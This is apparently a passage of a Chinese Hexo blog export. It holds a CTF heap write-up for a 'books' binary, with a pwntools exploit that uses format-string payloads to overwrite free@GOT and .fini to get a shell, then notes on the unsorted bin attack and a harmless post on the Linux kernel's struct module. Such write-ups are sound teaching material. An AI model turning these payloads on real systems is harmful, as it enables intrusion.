failed!\\n\"</span>, <span class=\"number\">1u</span>LL, <span class=\"number\">0x12</span>uLL, <span class=\"built_in\">stderr</span>);</div><div class=\"line\">            result = <span class=\"number\">1L</span>L;</div><div class=\"line\">            <span class=\"keyword\">goto</span> finish;</div><div class=\"line\">          &#125;</div><div class=\"line\">          submit((__int64)final_str, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)order1, (<span class=\"keyword\">char</span> *)order2);</div><div class=\"line\">          v5 = <span class=\"number\">1</span>;</div><div class=\"line\">          <span class=\"keyword\">break</span>;</div><div class=\"line\">        <span class=\"keyword\">default</span>:</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">      &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  fwrite(<span class=\"string\">\"Something failed!\\n\"</span>, <span class=\"number\">1u</span>LL, <span class=\"number\">0x12</span>uLL, <span class=\"built_in\">stderr</span>);</div><div class=\"line\">  result = <span class=\"number\">1L</span>L;</div><div class=\"line\">finish:</div><div class=\"line\">  v4 = *MK_FP(__FS__, <span class=\"number\">40L</span>L) ^ v11;</div><div class=\"line\">  <span class=\"keyword\">return</span> result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>我们发现在<code>submit</code>函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在<code>submit</code>函数中溢出<code>dest</code>，利用格式化字符串。</p>\n<p>但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改<code>.fini</code>section为<code>main</code>的地址，以再结束后再次运行到<code>main</code>，关于<code>.fini</code>的作用在<a href=\"http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html\">这篇</a>中提到了</p>\n<blockquote>\n<p>.fini<br>This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.<br>.init<br>This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).</p>\n</blockquote>\n<p>总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。</p>\n<p>在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的<code>strcpy</code>会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用<code>submit</code>这个还能输里面的<code>strcat</code>来溢出<code>dest</code>里的字符串来得到格式化字符串。</p>\n<p>所以思路如下：</p>\n<ol>\n<li>free掉chunk2</li>\n<li>溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置</li>\n<li>submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改<code>.fini</code>为程序开始</li>\n<li>传入/bin/sh，得到shell</li>\n</ol>\n<p>由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span> </div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\">context(arch=<span class=\"string\">'amd64'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./books'</span>)</div><div class=\"line\">    libc =  ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./books'</span>)</div><div class=\"line\">free_got = elf.got[<span class=\"string\">'free'</span>]</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit1</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'order:\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit2</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'order:\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dele</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(str(index + <span class=\"number\">2</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">submit</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    dele(<span class=\"number\">2</span>)</div><div class=\"line\">    payload = <span class=\"string\">'%1908x'</span> + <span class=\"string\">'%13$hn'</span> <span class=\"comment\"># 400a39</span></div><div class=\"line\">    payload += <span class=\"string\">'%31$lx'</span></div><div class=\"line\">    payload = payload.ljust(<span class=\"number\">0x80</span>)</div><div class=\"line\">    payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x151</span>)</div><div class=\"line\">    edit1(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'5'</span>.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\x00'</span>) + p64(<span class=\"number\">0x6011f0</span>)</div><div class=\"line\"><span class=\"comment\">#    payload += '%&#123;&#125;x'.format(39 - len(payload)) + '%13$hhn'</span></div><div class=\"line\">    gdb.attach(p)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvuntil(<span class=\"string\">'400fda'</span>)</div><div class=\"line\">    leak_addr = int(p.recv(<span class=\"number\">12</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'leak_addr =&gt; '</span>, hex(leak_addr)</div><div class=\"line\">    libc.address = leak_addr - <span class=\"number\">241</span> - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc.address =&gt; '</span>, hex(libc.address)</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\"></div><div class=\"line\">    dele(<span class=\"number\">2</span>)</div><div class=\"line\">    low_bytes = int(hex(system_addr)[<span class=\"number\">-4</span>:], <span class=\"number\">16</span>)</div><div class=\"line\">    mid_bytes = int(hex(system_addr)[<span class=\"number\">8</span>:<span class=\"number\">10</span>], <span class=\"number\">16</span>)</div><div class=\"line\">    payload = <span class=\"string\">'%&#123;&#125;x'</span>.format(int(hex(system_addr)[<span class=\"number\">8</span>:<span class=\"number\">10</span>], <span class=\"number\">16</span>) - <span class=\"number\">12</span>) + <span class=\"string\">'%13$hhn'</span></div><div class=\"line\">    payload += <span class=\"string\">'%&#123;&#125;x'</span>.format(low_bytes - mid_bytes) + <span class=\"string\">'%14$hn'</span></div><div class=\"line\">    payload = payload.ljust(<span class=\"number\">0x80</span>)</div><div class=\"line\">    payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x151</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    edit1(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'5'</span>.ljust(<span class=\"number\">8</span>, <span class=\"string\">'\\x00'</span>) + p64(free_got+<span class=\"number\">2</span>)</div><div class=\"line\">    payload += p64(free_got)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"0x0A-unsorted-bin-attack\"><a href=\"#0x0A-unsorted-bin-attack\" class=\"headerlink\" title=\"0x0A unsorted bin attack\"></a>0x0A unsorted bin attack</h2><p>这个应该是最简单的堆溢出技术了吧，先看当我们释放<code>unsortbin</code>时的源码</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bck = victim-&gt;bk;</div><div class=\"line\">.........</div><div class=\"line\"><span class=\"comment\">/* remove from unsorted list */</span></div><div class=\"line\">unsorted_chunks (av)-&gt;bk = bck;</div><div class=\"line\">bck-&gt;fd = unsorted_chunks (av);</div></pre></td></tr></table></figure>\n<p>并没有使用<code>unlink</code>宏，所以这里不存在检查指针的情况，如果我们修改了<code>victim-&gt;bk</code>的值为<code>fake_addr</code>，那么<code>(av)-&gt;bk</code>也会被修改，同时<code>fake_addr+16 = victim-&gt;bk-&gt;fd = (av)</code>，我们就将一个大的数字写到了<code>fack_addr+16</code>的位置去。但是由于<code>(av)-&gt;bk</code>被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。</p>\n<p>这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改<code>global_max_fast</code>，这样我们在剩下分配其他内存时都会以<code>fastbin</code>的方式分配，为<code>fastbin</code>攻击做准备。</p>\n<h3 id=\"例题-2\"><a href=\"#例题-2\" class=\"headerlink\" title=\"例题\"></a>例题</h3><p>这里用给出的20160ctf的ZeroStorage为例<br>Orz我去这程序怎么这么长。。。</p>"},{"title":"linux内核模块初涉","date":"2017-11-17T02:07:20.000Z","_content":"\n## linux/module.h\n\n重要结构体，该结构体包含`module`的几乎所有信息\n```\n\nstruct module {\n\tenum module_state state;\n\n\t/* Member of list of modules */\n\tstruct list_head list;\n\n\t/* Unique handle for this module */\n\tchar name[MODULE_NAME_LEN];\n\n\t/* Sysfs stuff. */\n\tstruct module_kobject mkobj;\n\tstruct module_attribute *modinfo_attrs;\n\tconst char *version;\n\tconst char *srcversion;\n\tstruct kobject *holders_dir;\n\n\t/* Exported symbols */\n\tconst struct kernel_symbol *syms;\n\tconst s32 *crcs;\n\tunsigned int num_syms;\n\n\t/* Kernel parameters. */\n#ifdef CONFIG_SYSFS\n\tstruct mutex param_lock;\n#endif\n\tstruct kernel_param *kp;\n\tunsigned int num_kp;\n\n\t/* GPL-only exported symbols. */\n\tunsigned int num_gpl_syms;\n\tconst struct kernel_symbol *gpl_syms;\n\tconst s32 *gpl_crcs;\n\n#ifdef CONFIG_UNUSED_SYMBOLS\n\t/* unused exported symbols. */\n\tconst struct kernel_symbol *unused_syms;\n\tconst s32 *unused_crcs;\n\tunsigned int num_unused_syms;\n\n\t/* GPL-only, unused exported symbols. */\n\tunsigned int num_unused_gpl_syms;\n\tconst struct kernel_symbol *unused_gpl_syms;\n\tconst s32 *unused_gpl_crcs;\n#endif\n\n#ifdef CONFIG_MODULE_SIG\n\t/* Signature was verified. */\n\tbool sig_ok;\n#endif\n\n\tbool async_probe_requested;\n\n\t/* symbols that will be GPL-only in the near future. */\n\tconst struct kernel_symbol *gpl_future_syms;\n\tconst s32 *gpl_future_crcs;\n\tunsigned int num_gpl_future_syms;\n\n\t/* Exception table */\n\tunsigned int num_exentries;\n\tstruct exception_table_entry *extable;\n\n\t/* Startup function. */\n\tint (*init)(void);\n\n\t/* Core layout: rbtree is accessed frequently, so keep together. */\n\tstruct module_layout core_layout __module_layout_align;\n\tstruct module_layout init_layout;\n\n\t/* Arch-specific module values */\n\tstruct mod_arch_specific arch;\n\n\tunsigned long taints;\t/* same bits as kernel:taint_flags */\n\n#ifdef CONFIG_GENERIC_BUG\n\t/* Support for BUG */\n\tunsigned num_bugs;\n\tstruct list_head bug_list;\n\tstruct bug_entry *bug_table;\n#endif\n\n#ifdef CONFIG_KALLSYMS\n\t/* Protected by RCU and/or module_mutex: use rcu_dereference() */\n\tstruct mod_kallsyms *kallsyms;\n\tstruct mod_kallsyms core_kallsyms;\n\n\t/* Section attributes */\n\tstruct module_sect_attrs *sect_attrs;\n\n\t/* Notes attributes */\n\tstruct module_notes_attrs *notes_attrs;\n#endif\n\n\t/* The command line arguments (may be mangled).  People like\n\t   keeping pointers to this stuff */\n\tchar *args;\n\n#ifdef CONFIG_SMP\n\t/* Per-cpu data. */\n\tvoid __percpu *percpu;\n\tunsigned int percpu_size;\n#endif\n\n#ifdef CONFIG_TRACEPOINTS\n\tunsigned int num_tracepoints;\n\tstruct tracepoint * const *tracepoints_ptrs;\n#endif\n#ifdef HAVE_JUMP_LABEL\n\tstruct jump_entry *jump_entries;\n\tunsigned int num_jump_entries;\n#endif\n#ifdef CONFIG_TRACING\n\tunsigned int num_trace_bprintk_fmt;\n\tconst char **trace_bprintk_fmt_start;\n#endif\n#ifdef CONFIG_EVENT_TRACING\n\tstruct trace_event_call **trace_events;\n\tunsigned int num_trace_events;\n\tstruct trace_eval_map **trace_evals;\n\tunsigned int num_trace_evals;\n#endif\n#ifdef CONFIG_FTRACE_MCOUNT_RECORD\n\tunsigned int num_ftrace_callsites;\n\tunsigned long *ftrace_callsites;\n#endif\n\n#ifdef CONFIG_LIVEPATCH\n\tbool klp; /* Is this a livepatch module? */\n\tbool klp_alive;\n\n\t/* Elf information */\n\tstruct klp_modinfo *klp_info;\n#endif\n\n#ifdef CONFIG_MODULE_UNLOAD\n\t/* What modules depend on me? */\n\tstruct list_head source_list;\n\t/* What modules do I depend on? */\n\tstruct list_head target_list;\n\n\t/* Destruction function. */\n\tvoid (*exit)(void);\n\n\tatomic_t refcnt;\n#endif\n\n#ifdef CONFIG_CONSTRUCTORS\n\t/* Constructor functions. */\n\tctor_fn_t *ctors;\n\tunsigned int num_ctors;\n#endif\n} ____cacheline_aligned __randomize_layout;\n```\n<!--more-->\n\n`state`字段是模块内部状态，可以有四个值\n```\nenum module_state {\n\tMODULE_STATE_LIVE,\t/* Normal state. */\n\tMODULE_STATE_COMING,\t/* Full formed, running module_init. */\n\tMODULE_STATE_GOING,\t/* Going away. */\n\tMODULE_STATE_UNFORMED,\t/* Still setting it up. */\n};\n```\n\n模块的初始化方法\n```\n\t/* Startup function. */\n\tint (*init)(void);\n```\n\n模块的卸载方法，其中有两个链表，分别表示依赖该模块和该模块依赖的模块\n```\n#ifdef CONFIG_MODULE_UNLOAD\n\t/* What modules depend on me? */\n\tstruct list_head source_list;\n\t/* What modules do I depend on? */\n\tstruct list_head target_list;\n\n\t/* Destruction function. */\n\tvoid (*exit)(void);\n\n\tatomic_t refcnt;\n#endif\n```\n","source":"_posts/linux内核模块初涉.md","raw":"---\ntitle: linux内核模块初涉\ntags:\n  - kernel\ncategories: []\ndate: 2017-11-17 10:07:20\n---\n\n## linux/module.h\n\n重要结构体，该结构体包含`module`的几乎所有信息\n```\n\nstruct module {\n\tenum module_state state;\n\n\t/* Member of list of modules */\n\tstruct list_head list;\n\n\t/* Unique handle for this module */\n\tchar name[MODULE_NAME_LEN];\n\n\t/* Sysfs stuff. */\n\tstruct module_kobject mkobj;\n\tstruct module_attribute *modinfo_attrs;\n\tconst char *version;\n\tconst char *srcversion;\n\tstruct kobject *holders_dir;\n\n\t/* Exported symbols */\n\tconst struct kernel_symbol *syms;\n\tconst s32 *crcs;\n\tunsigned int num_syms;\n\n\t/* Kernel parameters. */\n#ifdef CONFIG_SYSFS\n\tstruct mutex param_lock;\n#endif\n\tstruct kernel_param *kp;\n\tunsigned int num_kp;\n\n\t/* GPL-only exported symbols. */\n\tunsigned int num_gpl_syms;\n\tconst struct kernel_symbol *gpl_syms;\n\tconst s32 *gpl_crcs;\n\n#ifdef CONFIG_UNUSED_SYMBOLS\n\t/* unused exported symbols. */\n\tconst struct kernel_symbol *unused_syms;\n\tconst s32 *unused_crcs;\n\tunsigned int num_unused_syms;\n\n\t/* GPL-only, unused exported symbols. */\n\tunsigned int num_unused_gpl_syms;\n\tconst struct kernel_symbol *unused_gpl_syms;\n\tconst s32 *unused_gpl_crcs;\n#endif\n\n#ifdef CONFIG_MODULE_SIG\n\t/* Signature was verified. */\n\tbool sig_ok;\n#endif\n\n\tbool async_probe_requested;\n\n\t/* symbols that will be GPL-only in the near future. */\n\tconst struct kernel_symbol *gpl_future_syms;\n\tconst s32 *gpl_future_crcs;\n\tunsigned int num_gpl_future_syms;\n\n\t/* Exception table */\n\tunsigned int num_exentries;\n\tstruct exception_table_entry *extable;\n\n\t/* Startup function. */\n\tint (*init)(void);\n\n\t/* Core layout: rbtree is accessed frequently, so keep together. */\n\tstruct module_layout core_layout __module_layout_align;\n\tstruct module_layout init_layout;\n\n\t/* Arch-specific module values */\n\tstruct mod_arch_specific arch;\n\n\tunsigned long taints;\t/* same bits as kernel:taint_flags */\n\n#ifdef CONFIG_GENERIC_BUG\n\t/* Support for BUG */\n\tunsigned num_bugs;\n\tstruct list_head bug_list;\n\tstruct bug_entry *bug_table;\n#endif\n\n#ifdef CONFIG_KALLSYMS\n\t/* Protected by RCU and/or module_mutex: use rcu_dereference() */\n\tstruct mod_kallsyms *kallsyms;\n\tstruct mod_kallsyms core_kallsyms;\n\n\t/* Section attributes */\n\tstruct module_sect_attrs *sect_attrs;\n\n\t/* Notes attributes */\n\tstruct module_notes_attrs *notes_attrs;\n#endif\n\n\t/* The command line arguments (may be mangled).  People like\n\t   keeping pointers to this stuff */\n\tchar *args;\n\n#ifdef CONFIG_SMP\n\t/* Per-cpu data. */\n\tvoid __percpu *percpu;\n\tunsigned int percpu_size;\n#endif\n\n#ifdef CONFIG_TRACEPOINTS\n\tunsigned int num_tracepoints;\n\tstruct tracepoint * const *tracepoints_ptrs;\n#endif\n#ifdef HAVE_JUMP_LABEL\n\tstruct jump_entry *jump_entries;\n\tunsigned int num_jump_entries;\n#endif\n#ifdef CONFIG_TRACING\n\tunsigned int num_trace_bprintk_fmt;\n\tconst char **trace_bprintk_fmt_start;\n#endif\n#ifdef CONFIG_EVENT_TRACING\n\tstruct trace_event_call **trace_events;\n\tunsigned int num_trace_events;\n\tstruct trace_eval_map **trace_evals;\n\tunsigned int num_trace_evals;\n#endif\n#ifdef CONFIG_FTRACE_MCOUNT_RECORD\n\tunsigned int num_ftrace_callsites;\n\tunsigned long *ftrace_callsites;\n#endif\n\n#ifdef CONFIG_LIVEPATCH\n\tbool klp; /* Is this a livepatch module? */\n\tbool klp_alive;\n\n\t/* Elf information */\n\tstruct klp_modinfo *klp_info;\n#endif\n\n#ifdef CONFIG_MODULE_UNLOAD\n\t/* What modules depend on me? */\n\tstruct list_head source_list;\n\t/* What modules do I depend on? */\n\tstruct list_head target_list;\n\n\t/* Destruction function. */\n\tvoid (*exit)(void);\n\n\tatomic_t refcnt;\n#endif\n\n#ifdef CONFIG_CONSTRUCTORS\n\t/* Constructor functions. */\n\tctor_fn_t *ctors;\n\tunsigned int num_ctors;\n#endif\n} ____cacheline_aligned __randomize_layout;\n```\n<!--more-->\n\n`state`字段是模块内部状态，可以有四个值\n```\nenum module_state {\n\tMODULE_STATE_LIVE,\t/* Normal state. */\n\tMODULE_STATE_COMING,\t/* Full formed, running module_init. */\n\tMODULE_STATE_GOING,\t/* Going away. */\n\tMODULE_STATE_UNFORMED,\t/* Still setting it up. */\n};\n```\n\n模块的初始化方法\n```\n\t/* Startup function. */\n\tint (*init)(void);\n```\n\n模块的卸载方法，其中有两个链表，分别表示依赖该模块和该模块依赖的模块\n```\n#ifdef CONFIG_MODULE_UNLOAD\n\t/* What modules depend on me? */\n\tstruct list_head source_list;\n\t/* What modules do I depend on? */\n\tstruct list_head target_list;\n\n\t/* Destruction function. */\n\tvoid (*exit)(void);\n\n\tatomic_t refcnt;\n#endif\n```\n","slug":"linux内核模块初涉","published":1,"updated":"2017-11-18T01:03:43.441Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k320046hv18g62jj3xl","content":"<h2 id=\"linux-module-h\"><a href=\"#linux-module-h\" class=\"headerlink\" title=\"linux/module.h\"></a>linux/module.h</h2><p>重要结构体，该结构体包含<code>module</code>的几乎所有信息<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> <span class=\"keyword\">module</span> &#123;</div><div class=\"line\">\t<span class=\"keyword\">enum</span> module_state state;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Member of list of modules */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_head <span class=\"built_in\">list</span>;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Unique handle for this module */</span></div><div class=\"line\">\t<span class=\"keyword\">char</span> name[MODULE_NAME_LEN];</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Sysfs stuff. */</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_kobject mkobj;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> module_attribute *modinfo_attrs;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *version;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *srcversion;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> kobject *holders_dir;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Exported symbols */</span></div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 *crcs;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_syms;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* Kernel parameters. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SYSFS</span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> mutex param_lock;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">\t<span class=\"keyword\">struct</span> kernel_param *kp;</div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_kp;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* GPL-only exported symbols. */</span></div><div class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> num_gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> <span class=\"keyword\">struct</span> kernel_symbol *gpl_syms;</div><div class=\"line\">\t<span class=\"keyword\">const</span> s32 